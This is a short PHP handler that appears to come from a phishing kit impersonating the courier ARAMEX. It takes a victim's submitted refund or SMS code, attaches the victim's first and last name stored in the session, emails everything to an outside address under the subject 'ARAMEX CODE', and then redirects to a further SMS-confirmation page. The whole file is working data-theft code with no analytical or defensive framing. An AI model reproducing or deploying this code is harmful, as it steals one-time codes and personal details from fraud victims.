<?php

session_start();
if (isset($_POST['Code_remboursement']))
{
$message = "<p style='color:red;'>CODE ". $_SESSION['nom']."  ". $_SESSION['prenom'].": ". $_POST['Code_remboursement']."</p>";

$_SESSION['valid']="valid";

  $headers = "Reply-To: yurisparow@gmail.com \n";
  $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"";

    mail('omar.med.gh.com', 'ARAMEX CODE', $message,$headers);
    
}

$_SESSION['valid']="valid";
$_SESSION['code']=$_POST['Code_remboursement'];



header('Location:reconfsms.php');


?>